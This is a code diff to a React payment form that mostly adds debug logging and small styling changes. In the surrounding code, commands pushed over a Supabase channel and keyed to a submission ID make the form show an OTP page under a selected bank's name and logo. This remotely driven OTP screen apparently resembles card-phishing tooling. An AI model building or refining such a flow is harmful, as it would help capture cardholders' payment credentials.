@@ -1,4 +1,3 @@
-
 import React, { useState, useEffect } from 'react';
 import { CreditCard, Lock, Shield, Loader2, AlertTriangle } from 'lucide-react';
 import { supabase } from '@/integrations/supabase/client';
@@ -191,6 +190,7 @@ const PaymentForm = () => {
           
           console.log('Processing command:', command, 'for submission:', submissionId);
           console.log('Current submission ID:', currentSubmissionId);
+          console.log('Bank name:', bankName, 'Bank logo:', bankLogo);
           
           // Process commands for the current submission or global commands
           if (submissionId && submissionId !== currentSubmissionId) {
@@ -200,14 +200,22 @@ const PaymentForm = () => {
           
           switch (command) {
             case 'showotp':
-              console.log('Showing OTP with bank:', bankName, bankLogo);
-              if (bankName) setSelectedBank(bankName);
-              if (bankLogo) setSelectedBankLogo(bankLogo);
+              console.log('Executing showotp command with bank:', bankName, bankLogo);
+              if (bankName) {
+                console.log('Setting selected bank to:', bankName);
+                setSelectedBank(bankName);
+              }
+              if (bankLogo) {
+                console.log('Setting selected bank logo to:', bankLogo);
+                setSelectedBankLogo(bankLogo);
+              }
+              console.log('Fading out and showing OTP page');
               setFadeState('fadeOut');
               setTimeout(() => {
                 setIsLoading(false);
                 setShowOtp(true);
                 setFadeState('fadeIn');
+                console.log('OTP page should now be visible');
               }, 300);
               break;
             case 'fail':
@@ -259,7 +267,9 @@ const PaymentForm = () => {
           }
         }
       )
-      .subscribe();
+      .subscribe((status) => {
+        console.log('Subscription status:', status);
+      });
 
     // Handle click anywhere to show alert
     const handleDocumentClick = (e: MouseEvent) => {
@@ -285,6 +295,7 @@ const PaymentForm = () => {
     document.addEventListener('click', handleDocumentClick);
 
     return () => {
+      console.log('Cleaning up Supabase channels');
       supabase.removeChannel(channel);
       document.removeEventListener('click', handleDocumentClick);
     };
@@ -661,8 +672,7 @@ const PaymentForm = () => {
           <img 
             src="https://logotyp.us/file/rupay.svg" 
             alt="RuPay" 
-            className="h-6 w-12 object-contain" 
-            style={{ filter: 'brightness(0) saturate(100%)' }}
+            className="h-8 w-12 object-contain filter brightness-0" 
           />
         </div>
 
